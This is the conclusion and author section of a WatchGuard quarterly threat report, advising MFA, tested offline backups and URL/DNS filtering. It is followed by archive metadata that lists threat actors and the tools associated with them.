Conclusion &\n Defense Highlights\n\n\n-----\n\n##### Conclusion & Defense Highlights\n\nYou’ve seen the results of last quarter’s threat landscape “game,” now it’s time to pick your\n\nsecurity lineup for next quarter. Throughout this report we’ve shared our expert commentator\n\nadvice but let’s finish with a summary of the most important security playbook strategies\n\ngoing forward.\n\n###### Considering these trends, here’s our security advice to survive next quarter:\n\n Multi-Factor Is a Must \n\nIf you’ve read our previous reports over the past year, you are well versed in our\n\nmulti-factor authentication (MFA) advice. We recommend you implement it at least\n\nfor your privileged logins, but better yet, add it to every user’s normal enterprise\n\nlogin, too. We’ve given this advice so regularly that we took a break from it last\n\nquarter. However, the ongoing MSP attacks during Q2 (and continuing today) prove\n\nhow absolutely necessary MFA is for any company – and even more so for managed\n\nservice providers (MSPs) who take responsibility for other companies’ IT. While MFA\n\nused to be cost prohibitive and overly complex, it has now become inexpensive\n\nand easy enough for even the smallest business. Cloud-based solutions, like\n\nWatchGuard’s AuthPoint, take most of the difficulty out of MFA deployments.\n\nFurthermore, the use of standard mobile devices as authentication factors removes\n\nthe need for expensive proprietary hardware. If the attacked MSPs had used MFA\n\nfor all of their management tools, the attackers who stole legitimate credentials\n\nwould likely not been able to use them. If you haven’t deployed MFA throughout\n\nyour company yet, it is probably the best strategy in your playbook this year.\n\n###### Go Beyond Backup Basics \n\nWe saw a number of targeted ransomware attacks last quarter, which naturally\n\nopens the subject of Backup. You’re surely already well aware that you should have\n\nbackups of all your data; even more so after all the ransomware incidents the past\n\nfive years. However, while everyone generically recommends that you do backups,\n\nfew go into the extra technical detail on making sure your backups are good. As\n\nvictims have gotten ransomware, some have found their existing backups did not\n\nrecover or took an unexpectedly long time to restore. Besides backing up, you\n\nshould also regularly test the restore process, to make sure the backups you have\n\nactually work. When you do this, you’ll also learn how long restores take. Some\n\nbackup technologies are quicker than others. Since downtime is money, make sure\n\nto pick the backup technology that restores fast enough for your business. Finally,\n\nknow that attackers target backup technology as well. You should implement MFA\n\nfor your backup management solution, and we recommend deploying both an offline\n\nand online solution, giving you a backup of your backup.\n\n\n-----\n\n###### Leverage URL and Domain Filtering to Defang\n Malicious Links\n\nWhether via phishing emails or just hijacked websites, we see attackers trying to deliver\n\nmillions of malicious links to our customers every quarter. Luckily, WatchGuard, and the\n\nsecurity industry in general, has tons of threat intelligence that we constantly update,\n\ncontaining all these known malicious sites. As long as you have some sort of web or\n\nDNS filtering security service, you can easily prevent users who do accidentally click\n\na bad link from receiving the malicious payload. WatchGuard has three services that\n\nhelp. WebBlocker provides web-based URL filtering that you can use both to block\n\nknown malicious sites, but also pick what category of site your users can visit. It helps\n\nwith both security and productivity. DNSWatch is another service that provides very\n\nsimilar functionality, but at the DNS level. This allows it to prevent your users from ever\n\nreaching a malicious domain no matter what network protocol they are using. Finally,\n\nour Reputation Enable Defense service takes real-time feedback from our anti-malware\n\nservice to recognize new links that distribute malware. These new links are immediately\n\nadded to our threat intelligence, allowing us to protect your users from the latest sites\n\nthe first time someone encounters them. In short, our combination of various URL and\n\nDomain filtering security services can keep a click-happy user safe from himself. If you’re\n\na WatchGuard customer, make sure you’ve enabled all this protection, and if you are not,\n\nbe sure to implement one of the other URL-and domain-filtering technologies available.\n\nNow that you’ve followed the trends, you should start winning more security games. Thanks for\n\nreading our Q2 report. We hope you found the information contained useful, and join us next\n\ntime to learn your results in Q3. As always, leave your comments or feedback about our report at\n\n**[SecurityReport@watchguard.com. See you next time.](mailto:SecurityReport%40watchguard.com?subject=)**\n\n\n-----\n\n**Corey Nachreiner**\n_Chief Technology Officer_\n\nRecognized as a thought leader in IT security, Corey spearheads WatchGuard’s technology\nvision and direction. Previously, he was the director of strategy and research at WatchGuard.\nCorey has operated at the frontline of cyber security for 19 years, and for nearly a decade\nhas been evaluating and making accurate predictions about information security trends. As\nan authority on network security and internationally quoted commentator, Corey has the\nexpertise to dissect complex security topics, making him a sought-after speaker at forums\nsuch as Gartner, Infosec and RSA. He is also a regular contributor to leading publications\nincluding CNET, Dark Reading, eWeek, Help Net Security, Information Week and Infosecurity,\n[and delivers WatchGuard’s “Daily Security Byte” video series on www.secplicity.org.](http://www.secplicity.org)\n\n**Marc Laliberte**\n_Sr. Security Threat Analyst_\n\nSpecializing in network security technologies, Marc’s industry experience allows him to\nconduct meaningful information security research and educate audiences on the latest\ncyber security trends and best practices. With speaking appearances at IT conferences and\nregular contributions to online IT and security publications, Marc is a security expert who\nenjoys providing unique insights and guidance to all levels of IT personnel.\n\n**Emil Hozan**\n_Jr. Security Threat Analyst_\n\nBeing a member of WatchGuard Technologies’ Threat Lab as a Jr. Security Analyst,\nEmil hopes to bridge the technological rift between end users and the sophistication of\ntechnology. Taking complex situations and then analyzing and breaking them down, Emil\nenjoys diving deep into technical matters and summing up his findings in an easy-to-digest\nmanner. He believes that being security-aware while online is only the tip of the iceberg\nand that what goes on in the background is just as important as being cautious. Emil is a\ntechnological enthusiast with many qualifications and years of experience in IT.\n\n**Trevor Collins**\n_Jr. Security Threat Analyst_\n\nTrevor Collins is a Jr. Security Analyst at WatchGuard Technologies, specializing in network\nand wireless security. Trevor earned his security know-how and several certifications through\nhis past military experience in the United States Air Force. Trevor is a regular contributor\nto Secplicity.org where he provides easily understood data analysis and commentary to\nIT professionals. Trevor’s experience with a wide range of network security vendors and\ntechnologies allows him to provide unique perspectives to the industry.\n\n**About WatchGuard Threat Lab**\nWatchGuard’s Threat Lab (previously the LiveSecurity Threat Team) is a group of dedicated threat\nresearchers committed to discovering and studying the latest malware and Internet attacks. The\nThreat Lab team analyzes data from WatchGuard’s Firebox Feed, internal and partner threat\nintelligence, and a research honeynet, to provide insightful analysis about the top threats on the\nInternet. Their smart, practical security advice will enable you to better protect your organization in\nthe ever-changing threat landscape.\n\n**About WatchGuard Technologies**\nWatchGuard [®] Technologies, Inc. is a global leader in network security, secure Wi-Fi, multi-factor\nauthentication, and network intelligence. The company’s award-winning products and services are\ntrusted around the world by nearly 10,000 security resellers and service providers to protect more\nthan 80,000 customers. WatchGuard’s mission is to make enterprise-grade security accessible\nto companies of all types and sizes through simplicity, making WatchGuard an ideal solution for\nmidmarket businesses and distributed enterprises. The company is headquartered in Seattle,\nWashington, with offices throughout North America, Europe, Asia Pacific, and Latin America. To\n[learn more, visit WatchGuard.com.](http://WatchGuard.com)\n\nFor additional information, promotions and updates, follow WatchGuard on Twitter @WatchGuard,\non Facebook and on the LinkedIn Company page Also visit our InfoSec blog Secplicity for real\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        }
    ],
    "references": [
        "https://www.boll.ch/datasheets/WG_Threat_Report_EN.pdf"
    ],
    "report_names": [
        "WG_Threat_Report_EN.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c39b0fe6-5642-4717-9a05-9e94265e3e3a",
            "created_at": "2022-10-25T16:07:24.332084Z",
            "updated_at": "2025-03-27T02:02:10.175452Z",
            "deleted_at": null,
            "main_name": "Tonto Team",
            "aliases": [
                "Bronze Huntley",
                "CactusPete",
                "Earth Akhlut",
                "HartBeat",
                "Karma Panda",
                "LoneRanger",
                "Operation Bitter Biscuit",
                "TAG-74",
                "Tonto Team"
            ],
            "source_name": "ETDA:Tonto Team",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "Bioazih",
                "Bisonal",
                "CONIME",
                "Dexbia",
                "Korlia",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "POISONPLUG.SHADOW",
                "RoyalRoad",
                "ShadowPad Winnti",
                "XShellGhost"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1569315020,
    "ts_modification_date": 1569315042,
    "files": {
        "pdf": "https://archive.orkl.eu/8f14a6c9e5826f398058a3d600b79c0a40a19b56.pdf",
        "text": "https://archive.orkl.eu/8f14a6c9e5826f398058a3d600b79c0a40a19b56.txt",
        "img": "https://archive.orkl.eu/8f14a6c9e5826f398058a3d600b79c0a40a19b56.jpg"
    }
}